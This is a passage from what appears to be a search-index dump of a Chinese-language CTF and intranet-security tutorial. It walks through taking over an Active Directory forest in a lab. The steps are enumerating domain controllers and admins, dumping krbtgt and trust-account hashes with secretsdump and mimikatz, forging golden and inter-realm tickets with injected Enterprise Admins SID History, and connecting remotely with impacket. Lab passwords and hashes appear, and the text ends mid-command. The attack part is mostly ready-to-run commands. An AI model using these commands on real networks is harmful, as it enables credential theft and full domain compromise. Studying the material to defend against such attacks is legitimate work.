<p>\u73b0\u5728\u6211\u4eec\u9700\u8981\u901a\u8fc7\u8be5\u673a\u5668\u4ee5\u53ca\u83b7\u53d6\u5230\u7684\u4fe1\u606f\u8fdb\u884c\u57df\u6797\u6a2a\u5411\uff0c\u76f4\u81f3\u63a5\u7ba1\u6574\u4e2a\u57df\u6797\uff01</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article10/index.html#_2","title":"\u67e5\u8be2\u57df\u63a7","text":"<p>\u8fd9\u4e00\u6b65\u4e3b\u8981\u67e5\u8be2\u57df\u6797\u4e2d\u4e09\u4e2a\u57df\u7684\u57df\u63a7\u5236\u5668\u3002\u67e5\u8be2\u7684\u624b\u6bb5\u6709\u5f88\u591a\uff0c\u8fd9\u91cc\u53ea\u6f14\u793a\u4f7f\u7528 adfind\u3001nslookup \u548c nltest \u8fdb\u884c\u67e5\u8be2\u3002</p> <p>\u901a\u8fc7\u8fd9\u4e9b\u624b\u6bb5\u67e5\u8be2\u5f97\u5230\u4e09\u4e2a\u57df\u7684\u57df\u63a7\u5236\u5668\u7684\u4fe1\u606f\u5982\u4e0b\uff1a</p> <p>\u6797\u6839\u57df xie.com \u57df\u63a7\u5236\u5668\uff1a</p> <ul> <li>AD\uff1a10.211.55.4</li> <li>AD02\uff1a10.211.55.8</li> </ul> <p>\u57df shanghai.xie.com \u57df\u63a7\u5236\u5668\uff1a</p> <ul> <li>SH-AD\uff1a10.211.55.13</li> </ul> <p>\u57df beijing.xie.com \u57df\u63a7\u5236\u5668\uff1a</p> <ul> <li>BJ-AD\uff1a10.211.55.14</li> </ul> <p>\u5177\u4f53\u67e5\u8be2\u547d\u4ee4\u5982\u4e0b\uff1a</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article10/index.html#1adfind","title":"1.Adfind \u67e5\u8be2","text":"<p>\u4f7f\u7528 adfind \u8fdb\u884c\u67e5\u8be2\uff0c\u53ea\u9700\u8981\u67e5\u8be2\u7684\u65f6\u5019\u6307\u5b9a\u4e0d\u540c\u7684\u57df base DN\uff0c\u5373\u53ef\u67e5\u8be2\u51fa\u4e0d\u540c\u57df\u7684\u57df\u63a7\u5236\u5668</p> <pre><code>#adfind \u67e5\u8be2\u57df xie.com \u7684\u57df\u63a7\nAdfind.exe -b dc=xie,dc=com -sc dclist\n\n#adfind \u67e5\u8be2\u57df shanghai.xie.com \u7684\u57df\u63a7\nAdfind.exe -b dc=shanghai,dc=xie,dc=com -sc dclist\n\n#adfind \u67e5\u8be2\u57df beijing.xie.com \u7684\u57df\u63a7\nAdfind.exe -b dc=beijing,dc=xie,dc=com -sc dclist\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u901a\u8fc7 adfind \u67e5\u8be2\u5f97\u5230\u4e09\u4e2a\u57df\u7684\u57df\u63a7\u5236\u5668\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article10/index.html#2nslookup","title":"2.nslookup \u67e5\u8be2","text":"<pre><code>#nslookup \u67e5\u8be2 xie.com \u7684\u57df\u63a7\nnslookup -qt=ns xie.com\n\n#nslookup \u67e5\u8be2 beijing.xie.com \u7684\u57df\u63a7\nnslookup -qt=ns beijing.xie.com\n\n#nslookup \u67e5\u8be2 shanghai.xie.com \u7684\u57df\u63a7\nnslookup -qt=ns shanghai.xie.com\n</code></pre> <p>\u901a\u8fc7 nslookup \u547d\u4ee4\u67e5\u8be2\u51fa\u6797\u6839\u57df xie.com \u7684\u57df\u63a7\uff1a</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article10/index.html#3nltest","title":"3.nltest \u67e5\u8be2","text":"<pre><code>#nltest \u67e5\u8be2 xie.com \u7684\u57df\u63a7\nnltest /DCLIST:xie.com\n\n#nltest \u67e5\u8be2 beijing.xie.com \u7684\u57df\u63a7\nnltest /DCLIST:beijing.xie.com\n\n#nltest \u67e5\u8be2 shanghai.xie.com \u7684\u57df\u63a7\nnltest /DCLIST:shanghai.xie.com\n</code></pre> <p>\u6ce8\uff1a\u8981\u67e5\u8be2\u5f53\u524d\u57df\u7684\u57df\u63a7\u5236\u5668\uff0c\u53ea\u9700\u8981\u6267\u884c net group \"domain controllers\" /domain \u5373\u53ef\u67e5\u8be2\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article10/index.html#_3","title":"\u67e5\u8be2\u57df\u7ba1\u7406\u5458\u548c\u4f01\u4e1a\u7ba1\u7406\u5458","text":"<p>\u67e5\u8be2\u57df\u6797\u4e2d\u4e09\u4e2a\u57df\u7684\u57df\u7ba1\u7406\u5458\u548c\u6797\u6839\u57df\u7684\u4f01\u4e1a\u7ba1\u7406\u5458\uff0c\u4e3a\u540e\u9762\u7684\u6743\u9650\u63d0\u5347\u505a\u51c6\u5907\u3002\u67e5\u8be2\u7684\u624b\u6bb5\u6709\u5f88\u591a\uff0c\u8fd9\u91cc\u53ea\u663e\u793a\u4f7f\u7528 adfind \u548c ADExplorer \u8fdb\u884c\u67e5\u8be2\u3002\u4f01\u4e1a\u7ba1\u7406\u5458\u53ea\u80fd\u5728\u6797\u6839\u57df xie.com \u5185\u67e5\u8be2\u3002\u901a\u8fc7\u4e0b\u9762\u8fd9\u4e9b\u624b\u6bb5\u67e5\u8be2\u5f97\u5230\u4e09\u4e2a\u57df\u7684\u57df\u7ba1\u7406\u5458\u7684\u5982\u4e0b\u4fe1\u606f\uff1a</p> <p>\u6797\u6839\u57df xie.com \u7684\u57df\u7ba1\u7406\u5458\u548c\u4f01\u4e1a\u7ba1\u7406\u5458\uff1a</p> <ul> <li>\u57df\u7ba1\u7406\u5458\uff1aadministrator\u3001admin</li> <li>\u4f01\u4e1a\u7ba1\u7406\u5458\uff1aadministrator</li> </ul> <p>\u57df shanghai.xie.com \u7684\u57df\u7ba1\u7406\u5458\uff1a</p> <ul> <li>\u57df\u7ba1\u7406\u5458\uff1aadministrator\u3001sh_admin</li> </ul> <p>\u57df beijing.xie.com \u7684\u57df\u7ba1\u7406\u5458\uff1a</p> <ul> <li>\u57df\u7ba1\u7406\u5458\uff1aadministrator\u3001bj_admin</li> </ul> <p>\u5177\u4f53\u67e5\u8be2\u547d\u4ee4\u5982\u4e0b\uff1a</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article10/index.html#1adfind_1","title":"1.Adfind \u67e5\u8be2","text":"<pre><code>#\u67e5\u8be2\u6797\u6839\u57df\u7684\u4f01\u4e1a\u7ba1\u7406\u5458\nAdfind.exe -b \"CN=Enterprise Admins,CN=Users,DC=xie,DC=com\" member\n#\u67e5\u8be2\u6797\u6839\u57df\u7684\u57df\u7ba1\u7406\u5458\nAdfind.exe -b \"CN=Domain Admins,CN=Users,DC=xie,DC=com\" member\n#\u67e5\u8be2 beijing.xie.com \u7684\u57df\u7ba1\u7406\u5458\nAdfind.exe -b \"CN=Domain Admins,CN=Users,DC=beijing,DC=xie,DC=com\" member\n#\u67e5\u8be2 shanghai.xie.com \u7684\u57df\u7ba1\u7406\u5458\nAdfind.exe -b \"CN=Domain Admins,CN=Users,DC=shanghai,DC=xie,DC=com\" member\n</code></pre>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article10/index.html#2adexplorer","title":"2.ADExplorer \u67e5\u8be2","text":"<p>\u9664\u4e86\u4f7f\u7528 Adfind \u67e5\u8be2\u5916\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528 ADExplorer \u67e5\u8be2\u3002\u53ea\u9700\u8981\u67e5\u8be2\u4e0d\u540c\u57df\u7684\u65f6\u5019\uff0c\u4f7f\u7528\u5f53\u524d\u83b7\u5f97\u7684\u51ed\u636e\u8fde\u63a5\u4e0d\u540c\u57df\u7684\u57df\u63a7\u5236\u5668\u5373\u53ef\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u8981\u67e5\u8be2\u5f53\u524d\u57df shanghai.xie.com \u7684\u57df\u7ba1\u7406\u5458\uff0c\u53ea\u9700\u8981\u4f7f\u7528\u5f53\u524d\u83b7\u5f97\u7684\u51ed\u636e sh_test \u548c\u5bc6\u7801\u8fde\u63a5 shanghai.xie.com \u7684\u57df\u63a7\u5236\u5668 10.211.55.13 \u5373\u53ef\u3002</p> <p></p> <p>\u7136\u540e\u67e5\u8be2 Users \u5bb9\u5668\u4e0b Domain Admins \u7ec4\u7684 member \u5c5e\u6027\u5373\u53ef\u67e5\u8be2\u5230\u57df\u7ba1\u7406\u5458\u3002\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u67e5\u8be2\u5230\u57df\u7ba1\u7406\u5458 sh_admin \u548c administrator\u3002</p> <p></p> <p>\u6ce8\uff1a\u8981\u67e5\u8be2\u5f53\u524d\u57df\u7684\u57df\u7ba1\u7406\u5458\uff0c\u53ea\u9700\u8981\u6267\u884c net group \"domain admins\" /domain \u5373\u53ef\u67e5\u8be2\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article10/index.html#_4","title":"\u67e5\u8be2\u6240\u6709\u57df\u7528\u6237","text":"<p>\u5728\u5f53\u524d\u4e3b\u673a Win2008R2 \u901a\u8fc7\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u67e5\u8be2\u5f53\u524d\u57df\u6240\u6709\u57df\u7528\u6237\u3002</p> <pre><code>net group \"domain users\"  /domain\n</code></pre> <p></p> <p>\u7136\u540e\u53ef\u4ee5\u4f7f\u7528 adfind \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u67e5\u8be2\u5176\u4ed6\u57df\u7684\u6240\u6709\u7528\u6237\u3002</p> <pre><code>#adfind \u67e5\u8be2\u57df xie.com \u7684\u6240\u6709\u57df\u7528\u6237\nAdfind.exe -b dc=xie,dc=com -f \"(&amp;(objectCategory=person)(objectClass=user))\" -dn\n#adfind \u67e5\u8be2\u57df beijing.xie.com \u7684\u6240\u6709\u57df\u7528\u6237\nAdfind.exe -b dc=beijing,dc=xie,dc=com -f \"(&amp;(objectCategory=person)(objectClass=user))\" -dn\n</code></pre>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article10/index.html#_5","title":"\u67e5\u8be2\u6240\u6709\u57df\u4e3b\u673a","text":"<p>\u5728\u5f53\u524d\u4e3b\u673a Win2008R2 \u901a\u8fc7\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u67e5\u8be2\u5f53\u524d\u57df\u6240\u6709\u57df\u4e3b\u673a\u3002</p> <pre><code>net group \"domain computers\" /domain\n</code></pre> <p></p> <p>\u7136\u540e\u53ef\u4ee5\u4f7f\u7528 adfind \u67e5\u8be2\u5176\u4ed6\u57df\u7684\u6240\u6709\u4e3b\u673a\u3002</p> <pre><code>#adfind \u67e5\u8be2\u57df xie.com \u7684\u6240\u6709\u57df\u4e3b\u673a\nAdFind.exe -b dc=xie,dc=com -f \"objectcategory=computer\" dn\n#adfind \u67e5\u8be2\u57df beijing.xie.com \u7684\u6240\u6709\u57df\u4e3b\u673a\nAdFind.exe -b dc=beijing,dc=xie,dc=com -f \"objectcategory=computer\" dn\n</code></pre>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article10/index.html#_6","title":"\u8de8\u57df\u6a2a\u5411","text":"<p>\u73b0\u5728\u5047\u8bbe\u5df2\u7ecf\u901a\u8fc7\u5176\u4ed6\u6f0f\u6d1e\u83b7\u5f97\u4e86\u67d0\u4e2a\u5b50\u57df\u7684\u57df\u63a7\u5236\u5668\u6743\u9650\uff0c\u7136\u540e\u9700\u8981\u8de8\u57df\u6a2a\u5411\u83b7\u5f97\u6797\u6839\u57df xie.com \u7684\u57df\u63a7\u5236\u5668\u6743\u9650\uff0c\u8fdb\u800c\u63a5\u7ba1\u6574\u4e2a\u57df\u6797\u3002\u8fd9\u91cc\u8fdb\u884c\u8de8\u57df\u6a2a\u5411\u4f7f\u7528\u7684\u65b9\u6cd5\u5747\u6d89\u53ca\u5230\u4e86 SID History\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article10/index.html#1","title":"1.\u83b7\u5f97\u5b50\u57df\u6743\u9650","text":"<p>\u5047\u8bbe\u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u62ff\u5230\u4e86 shanghai.xie.com \u7684\u57df\u63a7\u548c\u57df\u7ba1\u7406\u5458\u6743\u9650\uff0c\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u901a\u8fc7 CobaltStrike \u5185\u7f6e\u7684 mimikatz \u6a21\u5757\u6293\u53d6\u5230 shanghai.xie.com \u7684\u57df\u7ba1\u7406\u5458 administrator \u7684\u51ed\u636e\u5982\u4e0b\uff1a</p> <p>\u54c8\u5e0c\uff1aaf112951ba8629d25a6a44417579283d \u901a\u8fc7\u89e3\u5bc6\u5f97\u5230\u660e\u6587\uff1aP@ssword12345</p> <p>\u7136\u540e\u5c31\u53ef\u4ee5\u4f7f\u7528 <code>secretsdump.py</code> \u811a\u672c\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u5229\u7528\u8be5\u57df\u7ba1\u7406\u5458\u51ed\u636e\u5bfc\u51fa\u5f53\u524d\u57df shanghai.xie.com \u7684\u4efb\u610f\u7528\u6237\u54c8\u5e0c\u4e86\u3002</p> <pre><code>#\u5bfc\u51fa\u5f53\u524d\u57df\u4e2d krbtgt \u7528\u6237\u54c8\u5e0c\uff0c\u7531\u4e8e\u57df\u6797\u4e2d\u6bcf\u4e2a\u57df\u90fd\u6709 krbtgt \u7528\u6237\uff0c\u56e0\u6b64\u9700\u8981\u52a0\u524d\u7f00\npython3 secretsdump.py shanghai/administrator:P@ssword12345@10.211.55.13 -just-dc-user \"shanghai\\krbtgt\"\n</code></pre> <p>\u6ce8\u610f\uff0c\u8fd9\u91cc\u6307\u5b9a\u7528\u6237\u65f6\u9700\u8981\u52a0\u524d\u7f00\uff0c\u5982\uff1ashanghai\\krbtgt \u3002\u56e0\u4e3a\u5728\u57df\u6797\u4e2d\uff0c\u6bcf\u4e2a\u57df\u4e2d\u90fd\u6709 krbtgt \u7528\u6237\uff0c\u56e0\u6b64\u9700\u8981\u6307\u5b9a\u3002</p> <p></p> <p>\u5982\u679c\u5bfc\u51fa\u7684\u662f\u8fd9\u4e2a\u57df\u4e2d\u7279\u6709\u7684\u7528\u6237\uff0c\u6216\u8005\u662f\u76f4\u63a5\u5bfc\u51fa\u6240\u6709\u7528\u6237\u7684\u8bdd\u53ef\u4e0d\u6307\u5b9a\u524d\u7f00\u3002\u547d\u4ee4\u5982\u4e0b\uff1a</p> <pre><code>#\u5bfc\u51fa\u5f53\u524d\u57df\u4e2d\u7279\u6709\u7684\u7528\u6237\u54c8\u5e0c\uff0c\u6b64\u65f6\u53ef\u4e0d\u52a0\u524d\u7f00\npython3 secretsdump.py shanghai/administrator:P@ssword12345@10.211.55.13 -just-dc-user sh_test\n\n#\u5bfc\u51fa\u5f53\u524d\u57df\u4e2d\u6240\u6709\u7528\u6237\u54c8\u5e0c\uff0c\u6b64\u65f6\u53ef\u4e0d\u52a0\u524d\u7f00\npython3 secretsdump.py shanghai/administrator:P@ssword12345@10.211.55.13 -just-dc\n</code></pre> <p></p> <p>\u5e76\u4e14\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5b50\u57df shanghai.xie.com \u7684\u57df\u7ba1\u7406\u5458\u65e0\u6743\u9650 DCSync \u6797\u6839\u57df xie.com \u548c\u53e6\u4e00\u4e2a\u5b50\u57df beijing.xie.com\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u5b50\u57df\u7684\u57df\u7ba1\u7406\u5458\u51ed\u636e\u65e0\u6743\u9650\u5bfc\u51fa\u5176\u4ed6\u57df\u7684\u7528\u6237\u54c8\u5e0c\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article10/index.html#2sid-history","title":"2.\u9ec4\u91d1\u7968\u636e+SID History \u83b7\u5f97\u6797\u6839\u57df\u6743\u9650","text":"<p>SID history \u662f\u5728\u5fae\u8f6f Windows \u670d\u52a1\u5668\u73af\u5883\u4e2d\u7528\u4e8e\u8eab\u4efd\u9a8c\u8bc1\u548c\u6388\u6743\u7684\u4e00\u4e2a\u91cd\u8981\u6982\u5ff5\uff0c\u5c24\u5176\u662f\u5728 Active Directory (AD) \u8fc1\u79fb\u8fc7\u7a0b\u4e2d\u3002</p> <p>SID\u7684\u6982\u5ff5:SID (Security Identifier) \u662f\u6bcf\u4e2a\u5bf9\u8c61\uff08\u7528\u6237\u3001\u7ec4\u3001\u8ba1\u7b97\u673a\u7b49\uff09\u5728 Windows \u7cfb\u7edf\u4e2d\u7684\u552f\u4e00\u6807\u8bc6\u7b26\u3002\u5b83\u7528\u4e8e\u6807\u8bc6\u7279\u5b9a\u7684\u7528\u6237\u6216\u7ec4\uff0c\u7cfb\u7edf\u901a\u8fc7 SID \u6765\u6388\u4e88\u8bbf\u95ee\u6743\u9650\u3002\u5f53\u7528\u6237\u5c1d\u8bd5\u8bbf\u95ee\u6587\u4ef6\u6216\u8d44\u6e90\u65f6\uff0c\u7cfb\u7edf\u4f1a\u68c0\u67e5\u5176 SID \u548c\u8bbf\u95ee\u63a7\u5236\u5217\u8868 (ACL) \u6765\u786e\u5b9a\u662f\u5426\u5141\u8bb8\u8bbf\u95ee\u3002</p> <p>SID History \u7684\u4f5c\u7528:\u5f53\u4e00\u4e2a\u7528\u6237\u6216\u7ec4\u4ece\u4e00\u4e2a\u57df\u8fc1\u79fb\u5230\u53e6\u4e00\u4e2a\u57df\u65f6\uff0c\u5b83\u4eec\u4f1a\u83b7\u5f97\u4e00\u4e2a\u65b0\u7684 SID\u3002\u95ee\u9898\u662f\uff0c\u76ee\u6807\u57df\u4e2d\u7684\u8d44\u6e90\uff08\u5982\u6587\u4ef6\u3001\u6587\u4ef6\u5939\u3001\u5171\u4eab\u7b49\uff09\u662f\u57fa\u4e8e\u65e7\u57df\u4e2d\u7684 SID \u8fdb\u884c\u8bbf\u95ee\u63a7\u5236\u7684\uff0c\u56e0\u6b64\u8fc1\u79fb\u540e\uff0c\u7528\u6237\u53ef\u80fd\u65e0\u6cd5\u8bbf\u95ee\u539f\u6709\u8d44\u6e90\u3002SID history \u7684\u4f5c\u7528\u662f\u4e3a\u7528\u6237\u4fdd\u7559\u5176\u65e7\u7684 SID\uff0c\u4ece\u800c\u5728\u65b0\u73af\u5883\u4e2d\u4f9d\u7136\u53ef\u4ee5\u8bbf\u95ee\u539f\u57df\u4e2d\u7684\u8d44\u6e90\uff0c\u800c\u65e0\u9700\u91cd\u65b0\u914d\u7f6e\u8bbf\u95ee\u6743\u9650.</p> <p>\u5de5\u4f5c\u539f\u7406:\u5f53\u7528\u6237\u767b\u5f55\u5e76\u5c1d\u8bd5\u8bbf\u95ee\u8d44\u6e90\u65f6\uff0c\u7cfb\u7edf\u4e0d\u4ec5\u68c0\u67e5\u5176\u5f53\u524d\u57df\u4e2d\u7684 SID\uff0c\u8fd8\u4f1a\u67e5\u770b\u7528\u6237\u7684 SID history\u3002\u5982\u679c SID history \u4e2d\u7684\u4efb\u4f55\u4e00\u4e2a SID \u4e0e\u8d44\u6e90\u7684 ACL \u5339\u914d\uff0c\u7528\u6237\u5c06\u88ab\u6388\u4e88\u8bbf\u95ee\u6743\u9650\u3002</p> <p>\u4f8b\u5982\uff1a\u7528\u6237 A \u4ece\u57df DomainA \u8fc1\u79fb\u5230\u57df DomainB\u3002\u5728\u8fc1\u79fb\u8fc7\u7a0b\u4e2d\uff0c\u7528\u6237 A \u83b7\u5f97\u4e86\u4e00\u4e2a\u65b0\u7684 SID\uff0c\u4f46\u540c\u65f6\u4fdd\u7559\u4e86\u5728 DomainA \u4e2d\u7684\u65e7 SID\u3002\u7528\u6237 A \u5c1d\u8bd5\u8bbf\u95ee\u4e00\u4e2a\u4ecd\u7136\u5c5e\u4e8e DomainA \u7684\u6587\u4ef6\uff0c\u800c\u8be5\u6587\u4ef6\u7684\u6743\u9650\u57fa\u4e8e\u7528\u6237 A \u5728 DomainA \u65f6\u7684 SID\u3002SID history \u4e2d\u5305\u542b\u7528\u6237 A \u7684\u65e7 SID\uff0c\u56e0\u6b64\u7cfb\u7edf\u5141\u8bb8\u7528\u6237\u8bbf\u95ee\u8be5\u6587\u4ef6</p> <p>\u4e0a\u9762\u6211\u4eec\u5df2\u7ecf\u83b7\u5f97\u4e86\u5b50\u57df shanghai.xie.com \u7684\u57df\u63a7\u5236\u5668\u6743\u9650\u548c\u57df\u7ba1\u7406\u5458\u6743\u9650\u4e86\uff0c\u73b0\u5728\u6211\u4eec\u60f3\u901a\u8fc7\u5df2\u6709\u7684\u6743\u9650\u83b7\u5f97\u6574\u4e2a\u57df\u6797\u7684\u63a7\u5236\u6743\u9650\u3002\u8fd9\u91cc\u6211\u4eec\u6f14\u793a\u4f7f\u7528\u9ec4\u91d1\u7968\u636e+SID History \u653b\u51fb\u6765\u8de8\u57df\u6a2a\u5411\u83b7\u5f97\u6797\u6839\u57df\u6743\u9650\u3002</p> <p>\u4f7f\u7528\u9ec4\u91d1\u7968\u636e+SID History \u653b\u51fb\u9996\u5148\u9700\u8981\u83b7\u53d6\u5f53\u524d\u57df shanghai.xie.com \u7684\u57dfSID \u4ee5\u53ca\u6797\u6839\u57df xie.com \u7684 Enterprise Admins \u7684 SID\uff0c\u8fd9\u4e2a\u901a\u8fc7 adfind \u6216\u8005adexplorer \u5747\u53ef\u67e5\u8be2\u5230\uff0c\u67e5\u8be2\u7ed3\u679c\u5982\u4e0b\uff1a</p> <ul> <li>shanghai.xie.com \u7684\u57df SID \u4e3a\uff1aS-1-5-21-909331469-3570597106-3737937367</li> <li>xie.com \u7684 Enterprise Admins \u7684 SID \u4e3a\uff1aS-1-5-21-1313979556-3624129433-4055459191-519</li> </ul> <p>\u800c shanghai.xie.com \u7684 krbtgt \u54c8\u5e0c\u5728\u4e0a\u9762\u6211\u4eec\u5df2\u7ecf\u5bfc\u51fa\u6765\u4e86\uff0c\u4e3a\uff1a17016f19a93e50c80860f32130fd600f</p> <p>\u8fd9\u91cc\u6211\u4eec\u6f14\u793a\u901a\u8fc7 mimikatz \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8fdb\u884c\u9ec4\u91d1\u7968\u636e+SID History \u653b\u51fb\uff1a</p> <pre><code>#\u751f\u6210\u6797\u6839\u57df\u7684\u9ec4\u91d1\u7968\u636e\nkerberos::golden /user:administrator /domain:shanghai.xie.com /sid:S-1-5-21-909331469-3570597106-3737937367 /krbtgt:17016f19a93e50c80860f32130fd600f /sids:S-1-5-21-1313979556-3624129433-4055459191-519 /ptt\n#\u5bfc\u51fa\u6797\u6839\u57df xie.com \u5185 krbtgt \u7528\u6237\u7684\u54c8\u5e0c\nlsadump::dcsync /domain:xie.com /user:xie\\krbtgt /csv\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u5229\u7528\u5b8c\u6210\u540e\uff0c\u5373\u53ef\u5bfc\u51fa\u6797\u6839\u57df xie.com \u7684 krbtgt \u7528\u6237\u54c8\u5e0c\u4e86\uff01</p> <p></p> <p>\u81f3\u6b64\uff0c\u6211\u4eec\u5df2\u7ecf\u83b7\u5f97\u4e86\u6574\u4e2a\u57df\u6797\u7684\u8bbf\u95ee\u6743\u9650\u4e86\uff01</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article10/index.html#3inter-realm-keysid-history","title":"3.inter-realm key+SID History \u83b7\u5f97\u6797\u6839\u57df\u6743\u9650","text":"<p>\u57df\u4fe1\u4efb\u4e2d\u6211\u4eec\u8bb2\u5230\u4e86\u8de8\u57df\u8d44\u6e90\u662f\u5982\u4f55\u8bbf\u95ee\u7684\u3002\u5982\u56fe\u6240\u793a:</p> <p></p> <p>\u56e0\u6b64\u53ea\u8981\u6211\u4eec\u83b7\u53d6\u5230\u4e86 inter-realm key \u5c31\u80fd\u5236\u4f5c\u8bbf\u95ee\u5176\u4ed6\u57df\u4efb\u610f\u670d\u52a1\u7684 ST\u670d\u52a1\u7968\u636e\u4e86\u3002\u7136\u540e\u5728 ST \u670d\u52a1\u7968\u636e\u4e2d\u52a0\u4e0a\u4f01\u4e1a\u7ba1\u7406\u5458\u7684 SID History\uff0c\u5c31\u53ef\u4ee5\u4ee5\u4f01\u4e1a\u7ba1\u7406\u5458\u6743\u9650\u8bbf\u95ee\u57df\u6797\u4e2d\u7684\u4efb\u610f\u670d\u52a1\u4e86\uff01</p> <p>\u90a3\u4e48\u5982\u4f55\u83b7\u5f97 inter-realm key \u5462\uff1f\u53ea\u8981\u83b7\u5f97\u4e86\u57df\u6797\u4e2d\u4efb\u610f\u57df\u7684\u57df\u63a7\u5236\u5668\u6743\u9650\uff0c\u5373\u53ef\u901a\u8fc7\u76f8\u5173\u5de5\u5177\u67e5\u8be2\u51fa inter-realm key\u3002\u4ee5\u4e0b\u6211\u4eec\u6f14\u793a\u901a\u8fc7 mimikatz \u548cimpacket \u811a\u672c\u83b7\u5f97 inter-realm key\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article10/index.html#1-mimikatz-inter-realm-key","title":"(1) mimikatz \u83b7\u5f97 inter-realm key","text":"<p>\u5728 shanghai.xie.com <code>\u57df\u63a7\u5236\u5668 SH-AD</code> \u4e0a\u901a\u8fc7 mimikatz \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u83b7\u5f97inter-realm key \u7684\u503c\u3002</p> <pre><code>mimikatz.exe \"privilege::debug\" \"lsadump::trust /patch\" \"exit\"\n</code></pre> <p></p> <p>\u83b7\u5f97\u5982\u4e0b\u4fe1\u606f\uff1a</p> <ul> <li>\u83b7\u5f97\u8fd9\u4e2a rc4_hmac_nt \u7684\u503c\u4e3a\uff1a0f81015ca4691b714e9db485568e5e6b</li> <li>shanghai.xie.com \u7684\u57df SID \u4e3a\uff1aS-1-5-21-909331469-3570597106-3737937367</li> <li>xie.com \u7684 Enterprise Admins \u7684 SID \u4e3a\uff1aS-1-5-21-1313979556-3624129433-4055459191-519</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article10/index.html#2-powershell-inter-realm-key","title":"(2) powershell \u83b7\u5f97 inter-realm key","text":"<p>\u6211\u4eec\u90fd\u77e5\u9053\uff0c\u52a0<code>$</code>\u7684\u662f\u673a\u5668\u8d26\u53f7\u3002\u4f46\u662f\u5728\u57df\u6797\u5185\uff0c\u5728 Users \u7ec4\u5e26<code>$</code>\u7684\u662f\u4fe1\u4efb\u8d26\u53f7\uff0c\u4fe1\u4efb\u8d26\u53f7\u7684\u54c8\u5e0c\u5c31\u662f inter-realm key\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u5728 shanghai.xie.com \u7684\u57df\u63a7\u4e0a\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u67e5\u8be2\uff0c\u53ef\u4ee5\u770b\u5230\u67e5\u8be2\u51fa\u6765\u7684\u662f <code>XIE$</code>\u8d26\u53f7\uff0c\u56e0\u4e3a\u8be5\u57df\u662f\u548c xie.com \u8fdb\u884c\u53cc\u5411\u4fe1\u4efb\uff0c\u56e0\u6b64\u4fe1\u4efb\u8d26\u53f7\u662f<code>XIE$</code>\u3002</p> <pre><code>Get-ADUser -filter * -Properties DistinguishedName,samAccountType | ?{$_. name -like \"*$\"}\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u67e5\u8be2\u51fa\u4fe1\u4efb\u8d26\u53f7 XIE$\u3002</p> <p></p> <p>\u7136\u540e\u53ef\u4ee5\u4f7f\u7528 secretsdump \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u5bfc\u51fa\u8be5\u4fe1\u4efb\u7528\u6237 XIE$\u7684\u54c8\u5e0c\u4e86\u3002</p> <pre><code>python3 secretsdump.py shanghai/administrator:P@ssword12345@10.211.55.13 -just-dc-user \"shanghai\\XIE$\"\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u5bfc\u51fa\u4fe1\u4efb\u8d26\u53f7 XIE$\u7684\u54c8\u5e0c\uff0c\u8be5\u54c8\u5e0c\u5373\u662f inter-realm key</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article10/index.html#3-impacket","title":"(3) impacket \u653b\u51fb","text":"<p>\u901a\u8fc7\u4e0a\u9762\u624b\u6bb5\u83b7\u5f97 inter-realm key \u540e\uff0c\u53ef\u4ee5\u5229\u7528 impacket \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8fdb\u884c\u653b\u51fb\uff1a</p> <pre><code>#\u751f\u6210\u9ad8\u6743\u9650\u7684\u9ec4\u91d1\u7968\u636e\npython3 ticketer.py -nthash 0f81015ca4691b714e9db485568e5e6b -domain-sid S-1-5-21-909331469-3570597106-3737937367 -extra-sid S-1-5-21-1313979556-3624129433-4055459191-519 -domain shanghai.xie.com -spn krbtgt/xie.com administrator\n#\u5bfc\u5165\u7968\u636e\nexport KRB5CCNAME=administrator.ccache\n#\u83b7\u5f97\u9ad8\u6743\u9650\u7684 cifs/ad.xie.com \u7684 ST \u670d\u52a1\u7968\u636e\npython3 getST.py -debug -k -no-pass -spn cifs/ad.xie.com -dc-ip 10.211.55.4xie.com/administrator\n#\u8fdc\u7a0b\u8fde\u63a5\u6797\u6839\u57df\u63a7\npython3 smbexec.py -no-pass -k 